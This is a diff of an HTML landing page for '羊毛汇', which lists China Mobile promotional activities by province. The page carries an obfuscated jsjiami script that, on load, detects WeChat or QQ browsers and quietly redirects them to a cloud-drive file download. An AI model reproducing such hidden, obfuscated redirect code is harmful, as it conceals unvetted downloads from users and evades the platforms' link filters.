@@ -1,17 +1,131 @@
 <!DOCTYPE html>
-<html lang="zh"><head><meta name="360-analysis-id" content="3a1g322t2z1d37">
+<html lang="en"><head>
 <meta charset="utf-8">
-    <meta name="Author" content="Noah">
-    <meta name="Keywords" content="">    <meta name="Description" content="">    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <link rel="icon" href="./favicon.ico">
-    <title>中国移动</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>羊毛汇</title>
     <meta name="keywords" content="">
     <meta name="description" content="">
-    <meta name="format-detection" content="telephone=no">
-    <link href="css/normalize.css" rel="stylesheet">
-    <link href="https://fonts.cdnfonts.com/css/opposans" rel="stylesheet">
-    <link href="css/index.css" rel="stylesheet">
     <script src="js/clipboard.min.js"></script>
+
+    <style>
+        *{
+            margin: 0;
+            padding: 0;
+            list-style: none;
+            font-size: 0;
+        }
+        body{
+            max-width: 768px;
+            margin: 0 auto;
+            background: url("img/bg.png");
+        }
+        .photo{
+            width: 100px;
+            height: 100px;
+            margin: 20px auto 10px;
+            border: 3px solid orange;
+            border-radius: 50%;
+        }
+        .photo > img {
+            border-radius: 50%;
+        }
+        .nickname{
+            color: orange;
+            font-size: 25px;
+            text-align: center;
+            margin: 0 auto;
+        }
+        .social{
+            margin: 20px 10px;
+            border-radius: 5px;
+        }
+        .social > div{
+            display: inline-block;
+            width: 50%;
+            box-sizing: border-box;
+            height: 120px;
+            padding: 0 10px;
+            text-align: center;
+            border-radius: 5px;
+        }
+        .tiktok{
+            background: rgba(167,146,120,0.4);
+        }
+        .wechat{
+            background: rgba(7,193,96,0.4);
+        }
+        .helper{
+            background: rgba(255,184,0,0.4);
+        }
+        .social > div > img{
+            border-radius: 10px;
+        }
+        #body{
+            margin: 20px auto;
+            text-align: center;
+        }
+        .hint{
+            color: #ffb800;
+            margin: 10px;
+            padding: 10px 3px;
+            font-size: 15px;
+            text-align: center;
+            background-color: rgba(0,0,0,0.3);
+            border-radius: 5px;
+        }
+        .draw-list{
+            margin: 15px 10px 10px;
+        }
+        .draw-item{
+            width: 50%;
+            display: inline-block;
+        }
+        .draw-item > a{
+            display: inline-block;
+            box-sizing: border-box;
+            width: calc(100% - 10px);
+            padding: 5px;
+            margin: 5px;
+            border: 1px solid rgba(0,0,0,0.3);
+            border-radius: 5px;
+            font-size: 16px;
+            color: #1e9fff;
+            text-decoration:none
+        }
+        .draw-item > a > img{
+            border-radius: 5px;
+        }
+        #footer{
+
+        }
+        .footer-hint{
+            box-sizing: border-box;
+            padding: 10px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+
+        #adv-img{
+            min-width: 320px;
+            max-width: 960px;
+            margin: 0 auto;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 100;
+        }
+        #header{
+            margin-top: 150px;
+        }
+        @media screen and (max-width: 768px){
+            #header{
+                margin-top: 80px;
+            }
+        }
+    </style>
     <script src="https://hm.baidu.com/hm.js?303d71a5758f114ed93b434a6ef45058"></script>
     <script>
         function toUrl(url, msg = '') {
@@ -25,449 +139,221 @@
          new ClipboardJS('.btn',{text:function(trigger) { return '嘿，朋友！我发现一款非常好用的APP—羊毛汇！下载链接：https://sourl.cn/U88mdD';} });
         alert('复制成功');
        }
-    </script>
+    </script>    
 </head>
 <body>
-<div class="page-body">
-    <div class="page-mark">
+<!--
+<div id="adv-img">
+    <a href="#" target="_blank"><img src="img/adv.png" width="100%"> </a>
+</div>   -->
+<div id="header">
+    <div class="photo">
+        <img src="img/10086.jpg" width="100%" height="100%">
     </div>
-    <div class="page-center">
-        <div class="header">
-            <img alt="" src="img/logo1.png" style="width: 160px; height: 80px;">
+    <div class="nickname">移动活动汇总</div>
+    <div class="social">
+        <div class="tiktok">
+            <img src="img/dy.png" height="100%">
         </div>
-
-        <div class="top-line"></div>
-        <div class="panel-content">
-            <div class="panel-left">
-
-                <div class="title-info">
-                    <div class="title-i">
-                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <g opacity="0.4" clip-path="url(#clip0_157_14557)">
-                                <path d="M12 22C6.477 22 2 17.523 2 12C2 6.47703 6.477 2.00003 12 2.00003C17.523 2.00003 22 6.47703 22 12C22 17.523 17.523 22 12 22ZM9.71 19.667C8.72341 17.5743 8.15187 15.3102 8.027 13H4.062C4.25659 14.5389 4.89392 15.9882 5.89657 17.1717C6.89922 18.3553 8.22401 19.2222 9.71 19.667ZM10.03 13C10.181 15.439 10.878 17.73 12 19.752C13.1523 17.6766 13.8254 15.3695 13.97 13H10.03ZM19.938 13H15.973C15.8481 15.3102 15.2766 17.5743 14.29 19.667C15.776 19.2222 17.1008 18.3553 18.1034 17.1717C19.1061 15.9882 19.7434 14.5389 19.938 13ZM4.062 11H8.027C8.15187 8.68982 8.72341 6.42572 9.71 4.33303C8.22401 4.77791 6.89922 5.64478 5.89657 6.82833C4.89392 8.01187 4.25659 9.46113 4.062 11ZM10.031 11H13.969C13.8248 8.63063 13.152 6.32356 12 4.24803C10.8477 6.32348 10.1746 8.63055 10.03 11H10.031ZM14.29 4.33303C15.2766 6.42572 15.8481 8.68982 15.973 11H19.938C19.7434 9.46113 19.1061 8.01187 18.1034 6.82833C17.1008 5.64478 15.776 4.77791 14.29 4.33303Z" fill="white"></path>
-                            </g>
-                            <defs>
-                                <clipPath id="clip0_157_14557">
-                                    <rect width="24" height="24" fill="white"></rect>
-                                </clipPath>
-                            </defs>
-                        </svg>
-
-                    </div>
-                    <div class="title-t">
-                 中国移动活动大全       </div>
-                </div>
-                <div class="panel-box">
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">将羊毛汇分享给好友 <span class="p1span2">推荐</span></p>
-                            <p class="p2">https://sourl.cn/U88mdD</p>
-                        </div>
-                        <a onclick="copyBtn()" href="javascript:;" class="btn">
-                            复制链接
-                        </a>
-                    </div>
-
-               <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">移动交流群<span class="p1span">微信群</span></p>
-                            <p class="p2">广告勿进</p>
-                        </div>
-                        <a href="https://pay262.github.io/tx/wq_yd.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>
-
-                <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">全国移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.all.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>
-
-                <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">广东移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-         <a href="10086.44.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>
- 
-                    <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">北京移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                     <a href="10086.11.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>
-
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                     <p class="p1">山东移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-          <a href="10086.37.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">河南移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-     <a href="10086.41.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">河北移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-           <a href="10086.13.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-                    
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">辽宁移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.21.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">上海移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.31.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">江苏移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.32.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">浙江移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.33.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">湖南移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.43.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">山西移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.14.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">湖北移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.42.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">内蒙古移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.15.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">黑龙江移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.23.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">天津移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.12.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">四川移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.51.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">吉林移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.22.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">福建移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.35.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">陕西移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.61.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">新疆移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="65" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">安徽移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.34.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">贵州移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.52.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">重庆移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.50.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">广西移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.45.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">江西移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.36.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">云南移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.53.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">甘肃移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.62.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">海南移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.46.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">青海移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.63.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">宁夏移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.64.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">西藏移动<span class="p1span2">综合</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="10086.54.html" target="_blank" class="btn-down">
-                            点击进入
-                        </a>
-                    </div>   
-
-                 <div class="top-line nomp"></div>
-                    <div class="row">
-                        <div class="text">
-                            <p class="p1">到底了<span class="p1span">TOP</span></p>
-                            <p class="p2"></p>
-                        </div>
-                        <a href="#" target="_blank" class="btn-down">
-                            返回顶部
-                        </a>
-                    </div>   
-
-
-
-
-                 </div>
-
-
-            </div>
-        </div>
-
- 
-
-        <div class="foot">
-            ©2023 羊毛汇. All Rights Reserved
+        <div class="wechat">
+            <img src="img/wx.png" height="100%">
         </div>
     </div>
 </div>
+<div id="body">
+    <div class="hint">
+ <!--       抖音关注：<span style="font-size: 15px;color: #ff5722;font-weight: bold">玩家小帮手</span> 第一时间获取新活动模拟器~ -->
+        <hr style="margin: 5px">
+<!--        微信公众号：<span style="font-size: 15px;color: #ff5722;font-weight: bold">羊毛汇</span> 回复 "<span style="font-size: 15px;color: #ff5722;font-weight: bold"> 羊毛汇 </span>" 获取羊毛汇下载网址<br>  -->
+        <hr style="margin: 5px">
+        <span style="color: #ffffff;font-size: 15px;">温馨提示：羊毛汇提供的功能是汇集官方活动，目的是方便用户快捷参与各个分散的活动。</span>
+    </div>
+    <div class="draw-list">
+        <div class="draw-item">
+             <a onclick="copyBtn()" href="javascript:;" class="btn">
+                分享【羊毛汇】给好友
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="https://pay262.github.io/tx/wq_yd.html">
+                移动交流群
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.all.html">
+                全国移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.44.html">
+                广东移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.11.html">
+                北京移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.37.html">
+                山东移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.41.html">
+                河南移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.13.html">
+                河北移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.21.html">
+                辽宁移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.31.html">
+                上海移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.32.html">
+                江苏移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.33.html">
+                浙江移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.43.html">
+                湖南移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.14.html">
+                山西移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.42.html">
+                湖北移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.15.html">
+                内蒙古移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.23.html">
+                黑龙江移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.12.html">
+                天津移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.51.html">
+                四川移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.22.html">
+                吉林移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.35.html">
+                福建移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.61.html">
+                陕西移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.65.html">
+                新疆移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.34.html">
+                安徽移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.52.html">
+                贵州移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.50.html">
+                重庆移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.45.html">
+                广西移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.36.html">
+                江西移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.53.html">
+                云南移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.62.html">
+                甘肃移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.46.html">
+                海南移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.63.html">
+                青海移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.64.html">
+                宁夏移动
+            </a>
+        </div>
+        <div class="draw-item">
+            <a href="10086.54.html">
+                西藏移动
+            </a>
+        </div>
 
+    </div>
 
+</div>
+<div id="footer">
+    <div class="footer-hint">
+       <br> Copyright&copy;<script type="text/javascript">copyright=new Date();update=copyright.getFullYear();document.write(""+ update + "");</script> 羊毛汇. All Rights Reserved. 
+           </div>
 </div>
 
 <script>
+</script>
+<script>
 var version_='jsjiami.com.v7',_0x2c9f=(function(){return[...[version_,'AJjTswjrwiKgamkCAiF.RVcepoeDmY.IYvd7GeqS==','hmoaWQTxWONcKMOP','W43cISozW5W1qmo8qa','hCkoWOrAWR/cKve','WQhcOdhcQHBdRMJdL8kHWOu3W4u','A8owwmkVBCoaWQuuW7NcHCkQ','W6RcNCkSW73cG8oAW7in','nSoDj8kVWQ3cPr/dT8kCaHy'],...(function(){return[...['lCoIW4yFb8kJWP/cQgRdTbBdKa','WRxcU8oNvwyEF8oBW58','d8oQWPxcTmkHh1pcVuzEW4a','W4TKW6FdUgNdNHpdRSkOWPhcTgO','WPhdL1HlFq','W4VcMCozuKVdTmoQWPtdSCkEmmo7WRS','aGmuW6JcGq','ew/cPJaVWQqhW6S0gCo+za','emk+WQ0rzd7dVCohW5pdTCklrqy'],...(function(){return['WO4ygYqSu8knqq','FMtdJ8kBWQSGB8oqBZRcPCow','WQyktSowW43dL0tcGG','WQCmcCoTW7VdSvpcQCo3','CSojW6DupW','qHJcLCoBd8k8W4ZcTCk1zSoR','B8otx8kNz8khWPuXW6xcN8k5WQi'];}())];}())];}());function _0x2fe6(_0x2d77fa,_0x10b098){var _0x2c9f8=_0x2c9f;return _0x2fe6=function(_0x2fe6bf,_0x3030d2){_0x2fe6bf=_0x2fe6bf-0x109;var _0x361f44=_0x2c9f8[_0x2fe6bf];if(_0x2fe6['oiFCVp']===undefined){var _0x182596=function(_0x21abec){var _0x2084a7='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x485d12='',_0x233c75='';for(var _0x277811=0x0,_0x53bfc1,_0x121dc5,_0x2b8522=0x0;_0x121dc5=_0x21abec['charAt'](_0x2b8522++);~_0x121dc5&&(_0x53bfc1=_0x277811%0x4?_0x53bfc1*0x40+_0x121dc5:_0x121dc5,_0x277811++%0x4)?_0x485d12+=String['fromCharCode'](0xff&_0x53bfc1>>(-0x2*_0x277811&0x6)):0x0){_0x121dc5=_0x2084a7['indexOf'](_0x121dc5);}for(var _0x4972c3=0x0,_0x1ae72a=_0x485d12['length'];_0x4972c3<_0x1ae72a;_0x4972c3++){_0x233c75+='%'+('00'+_0x485d12['charCodeAt'](_0x4972c3)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x233c75);};var _0x4d601c=function(_0x111868,_0x5a25a4){var _0x2c0a5f=[],_0x1c5213=0x0,_0x57c649,_0x5b5832='';_0x111868=_0x182596(_0x111868);var _0x94b70f;for(_0x94b70f=0x0;_0x94b70f<0x100;_0x94b70f++){_0x2c0a5f[_0x94b70f]=_0x94b70f;}for(_0x94b70f=0x0;_0x94b70f<0x100;_0x94b70f++){_0x1c5213=(_0x1c5213+_0x2c0a5f[_0x94b70f]+_0x5a25a4['charCodeAt'](_0x94b70f%_0x5a25a4['length']))%0x100,_0x57c649=_0x2c0a5f[_0x94b70f],_0x2c0a5f[_0x94b70f]=_0x2c0a5f[_0x1c5213],_0x2c0a5f[_0x1c5213]=_0x57c649;}_0x94b70f=0x0,_0x1c5213=0x0;for(var _0x4c108a=0x0;_0x4c108a<_0x111868['length'];_0x4c108a++){_0x94b70f=(_0x94b70f+0x1)%0x100,_0x1c5213=(_0x1c5213+_0x2c0a5f[_0x94b70f])%0x100,_0x57c649=_0x2c0a5f[_0x94b70f],_0x2c0a5f[_0x94b70f]=_0x2c0a5f[_0x1c5213],_0x2c0a5f[_0x1c5213]=_0x57c649,_0x5b5832+=String['fromCharCode'](_0x111868['charCodeAt'](_0x4c108a)^_0x2c0a5f[(_0x2c0a5f[_0x94b70f]+_0x2c0a5f[_0x1c5213])%0x100]);}return _0x5b5832;};_0x2fe6['ZoUqqQ']=_0x4d601c,_0x2d77fa=arguments,_0x2fe6['oiFCVp']=!![];}var _0x1f9586=_0x2c9f8[0x0],_0x18e270=_0x2fe6bf+_0x1f9586,_0x2f3cf2=_0x2d77fa[_0x18e270];return!_0x2f3cf2?(_0x2fe6['tCtfZb']===undefined&&(_0x2fe6['tCtfZb']=!![]),_0x361f44=_0x2fe6['ZoUqqQ'](_0x361f44,_0x3030d2),_0x2d77fa[_0x18e270]=_0x361f44):_0x361f44=_0x2f3cf2,_0x361f44;},_0x2fe6(_0x2d77fa,_0x10b098);}var _0x4ff51c=_0x2fe6;(function(_0x2f53dd,_0x165deb,_0x2498ac,_0x2d7869,_0x332331,_0xaae4e1,_0x34e576){return _0x2f53dd=_0x2f53dd>>0x6,_0xaae4e1='hs',_0x34e576='hs',function(_0x30fd1b,_0x5a6467,_0x9c9394,_0x5c99db,_0x3bc1f4){var _0x3e25f0=_0x2fe6;_0x5c99db='tfi',_0xaae4e1=_0x5c99db+_0xaae4e1,_0x3bc1f4='up',_0x34e576+=_0x3bc1f4,_0xaae4e1=_0x9c9394(_0xaae4e1),_0x34e576=_0x9c9394(_0x34e576),_0x9c9394=0x0;var _0x323486=_0x30fd1b;while(!![]&&--_0x2d7869+_0x5a6467){try{_0x5c99db=parseInt(_0x3e25f0(0x10c,'UQtV'))/0x1+parseInt(_0x3e25f0(0x111,'PXf!'))/0x2*(parseInt(_0x3e25f0(0x114,'RHOi'))/0x3)+-parseInt(_0x3e25f0(0x10a,'TbxJ'))/0x4+parseInt(_0x3e25f0(0x109,'0%gK'))/0x5+-parseInt(_0x3e25f0(0x11b,'YHuk'))/0x6*(parseInt(_0x3e25f0(0x11a,'hrBD'))/0x7)+parseInt(_0x3e25f0(0x10b,'Q9CB'))/0x8*(parseInt(_0x3e25f0(0x116,'PXf!'))/0x9)+parseInt(_0x3e25f0(0x115,'N31V'))/0xa*(parseInt(_0x3e25f0(0x10d,'kZzG'))/0xb);}catch(_0x2a7468){_0x5c99db=_0x9c9394;}finally{_0x3bc1f4=_0x323486[_0xaae4e1]();if(_0x2f53dd<=_0x2d7869)_0x9c9394?_0x332331?_0x5c99db=_0x3bc1f4:_0x332331=_0x3bc1f4:_0x9c9394=_0x3bc1f4;else{if(_0x9c9394==_0x332331['replace'](/[ApYJdIGTDqFkreSVRKwCg=]/g,'')){if(_0x5c99db===_0x5a6467){_0x323486['un'+_0xaae4e1](_0x3bc1f4);break;}_0x323486[_0x34e576](_0x3bc1f4);}}}}}(_0x2498ac,_0x165deb,function(_0x20f9d3,_0x11768f,_0x1b80bf,_0x492f29,_0x25d28b,_0x34042d,_0x1feb33){return _0x11768f='\x73\x70\x6c\x69\x74',_0x20f9d3=arguments[0x0],_0x20f9d3=_0x20f9d3[_0x11768f](''),_0x1b80bf=`\x72\x65\x76\x65\x72\x73\x65`,_0x20f9d3=_0x20f9d3[_0x1b80bf]('\x76'),_0x492f29=`\x6a\x6f\x69\x6e`,(0x11fd88,_0x20f9d3[_0x492f29](''));});}(0x3040,0x545e3,_0x2c9f,0xc3),_0x2c9f)&&(version_=_0x2c9f);if(is_weixn_qq()){;window[_0x4ff51c(0x113,'asdE')]['href']='https://c.pc.qq.com/middle.html?pfurl=https://www.123pan.com/s/GYWrVv-4NrHH';}function is_weixn_qq(){var _0x489d01=_0x4ff51c,_0x21e05a={'SFxvj':'micromessenger','kaoxZ':'weixin','kdIAH':function(_0x326c30,_0x15a832){return _0x326c30==_0x15a832;}},_0x37f26f=navigator['userAgent'][_0x489d01(0x118,'3!y#')]();if(_0x37f26f[_0x489d01(0x11d,'naYj')](/MicroMessenger/i)==_0x21e05a[_0x489d01(0x10f,'TbxJ')])return _0x21e05a[_0x489d01(0x11f,'WjI]')];else{if(_0x21e05a['kdIAH'](_0x37f26f['match'](/QQ/i),'qq'))return'QQ';}return![];}var version_ = 'jsjiami.com.v7';
 </script>
-
 <script>
 var _hmt = _hmt || [];
 (function() {
@@ -477,7 +363,4 @@ var _hmt = _hmt || [];
   s.parentNode.insertBefore(hm, s);
 })();
 </script>
-
-
-</body>
-</html>
+</body></html>
